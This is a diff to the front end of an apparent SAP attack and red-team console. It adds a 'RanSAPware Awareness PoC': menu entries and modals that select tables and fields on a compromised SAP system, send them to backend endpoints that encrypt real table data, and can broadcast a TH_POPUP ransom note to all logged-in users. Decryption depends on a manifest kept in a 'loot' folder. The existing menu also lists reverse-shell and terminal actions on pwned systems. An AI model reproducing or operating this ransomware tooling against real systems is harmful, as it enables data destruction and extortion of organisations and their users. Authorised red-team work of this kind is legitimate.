@@ -1280,6 +1280,14 @@ body {
       <div class="ctx-item" data-action="impact_view">&#128202; View Impact Results</div>
     </div>
   </div>
+  <!-- RanSAPware Awareness PoC -->
+  <div class="ctx-group">
+    <div class="ctx-item" style="color:#f85149">&#128274; RanSAPware Awareness</div>
+    <div class="ctx-sub">
+      <div class="ctx-item" data-action="ransapware_encrypt" style="color:#f85149">&#128274; Encrypt Table Data</div>
+      <div class="ctx-item" data-action="ransapware_decrypt">&#128275; Decrypt (Restore)</div>
+    </div>
+  </div>
   <!-- Cleanup submenu -->
   <div class="ctx-group">
     <div class="ctx-item">&#128465; Cleanup</div>
@@ -7507,6 +7515,10 @@ async function ctxAction(action) {
       showImpactDetail(sid); break;
     case 'impact_assess_java':
       await api('POST', `node/${sid}/impact_assess_java`); break;
+    case 'ransapware_encrypt':
+      showRansapwareModal(sid); break;
+    case 'ransapware_decrypt':
+      showRansapwareDecryptModal(sid); break;
     case 'os_terminal': showTerminalModal(sid); break;
     case 'reverse_shell': showShellModal(sid); break;
     case 'import_transport': showImportTransportModal(sid); break;
@@ -10446,6 +10458,221 @@ function showImpactDetail(sid) {
   });
 
   panel.classList.add('visible');
+}
+
+// ---------------------------------------------------------------------------
+// RanSAPware Awareness PoC — Encrypt / Decrypt modals
+// ---------------------------------------------------------------------------
+
+async function showRansapwareModal(sid) {
+  const n = (mapState.nodes || {})[sid];
+  if (!n) return;
+  if (!n.pwned && !(n.credentials || []).length && !(n.created_users || []).length) {
+    showToast('No credentials for ' + sid + ' — pwn the system first', 'error');
+    return;
+  }
+  const panel = document.getElementById('detail-panel');
+  panel.dataset.sid = sid;
+  panel.setAttribute('data-view', 'ransapware');
+
+  // Fetch suggested tables
+  let suggested = [];
+  try {
+    const r = await api('GET', 'ransapware/suggested_tables');
+    if (Array.isArray(r)) suggested = r;
+  } catch (_) {}
+
+  const sugRows = suggested.map(s =>
+    `<tr class="rw-sug-row" data-table="${escHtml(s.table)}" style="cursor:pointer"
+         onclick="document.getElementById('rw-table-input').value='${escHtml(s.table)}';rwFetchFields('${escHtml(sid)}')">
+       <td style="padding:3px 8px;font-family:monospace;font-weight:bold;color:#58a6ff">${escHtml(s.table)}</td>
+       <td style="padding:3px 8px;color:#8b949e">${escHtml(s.category)}</td>
+       <td style="padding:3px 8px;color:#8b949e;font-size:11px">${escHtml(s.desc)}</td>
+     </tr>`
+  ).join('');
+
+  panel.innerHTML = `
+    <span class="close-btn" onclick="this.parentElement.classList.remove('visible')">&times;</span>
+    <h3 style="color:#f85149">&#128274; RanSAPware Awareness PoC — ${escHtml(sid)}</h3>
+    <div style="background:#2d1215;border:1px solid #f85149;border-radius:6px;padding:10px 14px;margin-bottom:12px">
+      <div style="font-weight:bold;color:#f85149;margin-bottom:4px">&#9888; DESTRUCTIVE OPERATION</div>
+      <div style="font-size:12px;color:#e6edf3">This will <strong>encrypt</strong> real table data on <strong>${escHtml(sid)}</strong>.
+      Fields will be overwritten with scrambled values.  The data can be restored using the
+      Decrypt function — which requires the manifest file saved to your loot directory.
+      <br><br>A <strong>TH_POPUP</strong> ransom note will be broadcast to all logged-in SAP users.</div>
+    </div>
+    <div class="detail-section">
+      <h4>Step 1: Select Table</h4>
+      <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px">
+        <input id="rw-table-input" type="text" placeholder="Table name (e.g. KNA1)"
+               style="flex:1;background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;font-family:monospace;font-size:13px"
+               onkeydown="if(event.key==='Enter')rwFetchFields('${escHtml(sid)}')">
+        <button class="btn btn-primary" style="padding:6px 14px;font-size:12px"
+                onclick="rwFetchFields('${escHtml(sid)}')">Fetch Fields</button>
+      </div>
+      ${suggested.length ? `
+      <div style="font-size:11px;color:#8b949e;margin-bottom:4px">Suggested tables (click to select):</div>
+      <div style="max-height:180px;overflow-y:auto;border:1px solid #21262d;border-radius:4px">
+        <table style="width:100%;border-collapse:collapse;font-size:12px">
+          <tbody>${sugRows}</tbody>
+        </table>
+      </div>` : ''}
+    </div>
+    <div id="rw-fields-section" style="display:none">
+      <div class="detail-section">
+        <h4>Step 2: Select Fields to Encrypt</h4>
+        <div style="font-size:11px;color:#8b949e;margin-bottom:6px">
+          Only CHAR(15+) / STRING / LCHR fields shown.  Key fields are excluded.
+        </div>
+        <div id="rw-fields-list"></div>
+      </div>
+      <div class="detail-section">
+        <h4>Step 3: Options</h4>
+        <div style="display:flex;flex-direction:column;gap:6px">
+          <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:#e6edf3">
+            <span>Max rows:</span>
+            <input id="rw-max-rows" type="number" value="5000" min="1" max="999999"
+                   style="width:80px;background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:4px 8px;border-radius:4px;font-family:monospace">
+          </label>
+          <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:#e6edf3">
+            <input id="rw-popup" type="checkbox" checked style="accent-color:#f85149">
+            Send TH_POPUP ransom note to all users
+          </label>
+        </div>
+      </div>
+      <div style="margin-top:12px;text-align:center">
+        <button id="rw-encrypt-btn" class="btn" style="background:#da3633;border:1px solid #f85149;color:#fff;padding:10px 28px;font-size:14px;font-weight:bold;border-radius:6px;cursor:pointer"
+                onclick="rwEncrypt('${escHtml(sid)}')">
+          &#128274; ENCRYPT TABLE DATA
+        </button>
+      </div>
+    </div>
+  `;
+  panel.classList.add('visible');
+}
+
+async function rwFetchFields(sid) {
+  const table = (document.getElementById('rw-table-input').value || '').trim().toUpperCase();
+  if (!table) { showToast('Enter a table name', 'error'); return; }
+  const fSection = document.getElementById('rw-fields-section');
+  const fList = document.getElementById('rw-fields-list');
+  fList.innerHTML = '<div style="color:#8b949e;padding:8px">Fetching metadata...</div>';
+  fSection.style.display = 'block';
+  try {
+    const r = await api('POST', 'node/' + sid + '/ransapware/fields', {table});
+    if (r.error) { fList.innerHTML = '<div style="color:#f85149">' + escHtml(r.error) + '</div>'; return; }
+    const eligible = (r.fields || []).filter(f => f.eligible);
+    const keyFields = (r.fields || []).filter(f => f.is_key).map(f => f.name);
+    if (!eligible.length) {
+      fList.innerHTML = '<div style="color:#d29922">No eligible fields (CHAR15+ / STRING) found in ' + escHtml(table) + '</div>';
+      return;
+    }
+    fList.dataset.keyFields = JSON.stringify(keyFields);
+    fList.dataset.table = table;
+    fList.innerHTML = '<table style="width:100%;border-collapse:collapse;font-size:12px">'
+      + '<thead><tr style="color:#8b949e;border-bottom:1px solid #30363d">'
+      + '<th style="text-align:left;padding:3px 6px;width:30px"></th>'
+      + '<th style="text-align:left;padding:3px 6px">Field</th>'
+      + '<th style="text-align:left;padding:3px 6px">Type</th>'
+      + '<th style="text-align:left;padding:3px 6px">Len</th>'
+      + '<th style="text-align:left;padding:3px 6px">Description</th>'
+      + '</tr></thead><tbody>'
+      + eligible.map(f =>
+        '<tr><td style="padding:3px 6px"><input type="checkbox" class="rw-field-cb" value="' + escHtml(f.name) + '" checked style="accent-color:#f85149"></td>'
+        + '<td style="padding:3px 6px;font-family:monospace;font-weight:bold">' + escHtml(f.name) + '</td>'
+        + '<td style="padding:3px 6px;color:#8b949e">' + escHtml(f.datatype) + '</td>'
+        + '<td style="padding:3px 6px;color:#8b949e">' + f.length + '</td>'
+        + '<td style="padding:3px 6px;color:#8b949e;font-size:11px">' + escHtml(f.description) + '</td></tr>'
+      ).join('')
+      + '</tbody></table>';
+  } catch (e) {
+    fList.innerHTML = '<div style="color:#f85149">Error: ' + escHtml(String(e)) + '</div>';
+  }
+}
+
+async function rwEncrypt(sid) {
+  const fList = document.getElementById('rw-fields-list');
+  const table = (fList.dataset.table || '').trim();
+  const keyFields = JSON.parse(fList.dataset.keyFields || '[]');
+  const checked = [...document.querySelectorAll('.rw-field-cb:checked')].map(cb => cb.value);
+  if (!checked.length) { showToast('Select at least one field', 'error'); return; }
+  const maxRows = parseInt(document.getElementById('rw-max-rows').value, 10) || 5000;
+  const sendPopup = document.getElementById('rw-popup').checked;
+
+  if (!confirm(
+    'RANSAPWARE AWARENESS PoC\\n\\n'
+    + 'This will ENCRYPT ' + checked.length + ' field(s) in table ' + table
+    + ' on ' + sid + ' (up to ' + maxRows + ' rows).\\n\\n'
+    + 'The data will be UNREADABLE until decrypted.\\n'
+    + (sendPopup ? 'A TH_POPUP ransom note will appear on ALL user screens.\\n\\n' : '\\n')
+    + 'You MUST have the manifest file (saved in loot/) to reverse this.\\n\\n'
+    + 'Continue?'
+  )) return;
+
+  const btn = document.getElementById('rw-encrypt-btn');
+  btn.disabled = true;
+  btn.textContent = 'Encrypting...';
+
+  await api('POST', 'node/' + sid + '/ransapware/encrypt', {
+    table, fields: checked, key_fields: keyFields,
+    max_rows: maxRows, send_popup: sendPopup,
+  });
+  showToast('RanSAPware encryption started — check console for progress', 'info');
+  startPolling();
+}
+
+async function showRansapwareDecryptModal(sid) {
+  const panel = document.getElementById('detail-panel');
+  panel.dataset.sid = sid;
+  panel.setAttribute('data-view', 'ransapware-decrypt');
+
+  let manifests = [];
+  try {
+    manifests = await api('GET', 'node/' + sid + '/ransapware/manifests');
+    if (!Array.isArray(manifests)) manifests = [];
+  } catch (_) {}
+
+  const active = manifests.filter(m => !m.decrypted);
+  const restored = manifests.filter(m => m.decrypted);
+
+  const row = (m) => {
+    const statusColor = m.decrypted ? '#3fb950' : '#f85149';
+    const statusLabel = m.decrypted ? 'RESTORED' : 'ENCRYPTED';
+    return `<div style="border:1px solid #30363d;border-radius:6px;padding:10px 14px;margin:8px 0;background:#0d1117">
+      <div style="display:flex;justify-content:space-between;align-items:center">
+        <div>
+          <span style="font-family:monospace;font-weight:bold;font-size:13px">${escHtml(m.table)}</span>
+          <span style="color:${statusColor};font-size:11px;margin-left:8px">${statusLabel}</span>
+        </div>
+        <span style="color:#8b949e;font-size:11px">${escHtml(m.timestamp || '')}</span>
+      </div>
+      <div style="font-size:11px;color:#8b949e;margin-top:4px">
+        Fields: ${escHtml((m.fields || []).join(', '))} &middot;
+        Rows: ${m.rows_encrypted} &middot;
+        FM: ${escHtml(m.fm_name || '?')}
+        ${m.popup_sent ? ' &middot; <span style="color:#d29922">TH_POPUP sent</span>' : ''}
+      </div>
+      ${!m.decrypted ? `<button class="btn" style="margin-top:8px;background:#238636;border:1px solid #2ea043;color:#fff;padding:4px 14px;font-size:12px;border-radius:4px;cursor:pointer"
+        onclick="rwDecrypt('${escHtml(sid)}', '${escHtml(m.path)}')">&#128275; Decrypt (Restore)</button>` : ''}
+    </div>`;
+  };
+
+  panel.innerHTML = `
+    <span class="close-btn" onclick="this.parentElement.classList.remove('visible')">&times;</span>
+    <h3>&#128275; RanSAPware — Decrypt / Restore — ${escHtml(sid)}</h3>
+    ${!manifests.length ? '<div style="color:#8b949e;padding:12px">No ransapware manifests found for this system.  Run Encrypt first.</div>' : ''}
+    ${active.length ? '<h4 style="color:#f85149">Active (encrypted)</h4>' + active.map(row).join('') : ''}
+    ${restored.length ? '<h4 style="color:#3fb950;margin-top:12px">Restored</h4>' + restored.map(row).join('') : ''}
+  `;
+  panel.classList.add('visible');
+}
+
+async function rwDecrypt(sid, manifestPath) {
+  if (!confirm('Decrypt and restore the table data?')) return;
+  await api('POST', 'node/' + sid + '/ransapware/decrypt', {manifest_path: manifestPath});
+  showToast('RanSAPware decryption started — check console', 'info');
+  startPolling();
+  setTimeout(() => showRansapwareDecryptModal(sid), 3000);
 }
 
 function showFindings(sid) {
